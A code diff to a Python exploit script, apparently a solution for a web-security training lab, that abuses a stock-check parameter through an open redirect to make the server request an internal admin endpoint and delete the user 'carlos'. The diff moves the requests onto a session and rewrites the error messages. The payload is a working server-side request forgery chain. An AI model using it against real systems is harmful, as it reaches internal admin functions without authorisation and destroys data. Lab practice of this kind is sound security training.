@@ -3,13 +3,13 @@ import sys
 from requests.adapters import HTTPAdapter, Retry
 
 
-def delete_carlos_user(url):
+def delete_carlos_user(url, session):
     try:
         # Deleting the user "carlos"
-        requests.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"}, timeout=10)
+        session.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos"}, timeout=10)
 
         # Verifying user has been deleted
-        response = requests.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/"}, timeout=10)
+        response = session.post(f"{url}/product/stock", data ={"stockApi": "/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/"}, timeout=10)
         return "carlos" not in response.text and response.status_code == 200
 
     except requests.exceptions.Timeout:
@@ -17,11 +17,11 @@ def delete_carlos_user(url):
         sys.exit(1)
 
     except requests.exceptions.MissingSchema:
-        print(f"Please enter a valid URL.")
+        print("(-) Please enter a valid URL.")
         sys.exit(1)
 
-    except requests.exceptions.RequestException as e:
-        print(f"(-) An error has occurred: {e}")
+    except requests.exceptions.ConnectionError:
+        print("(-) Unable to connect to host. Please check your URL and try again.")
         sys.exit(1)
 
 
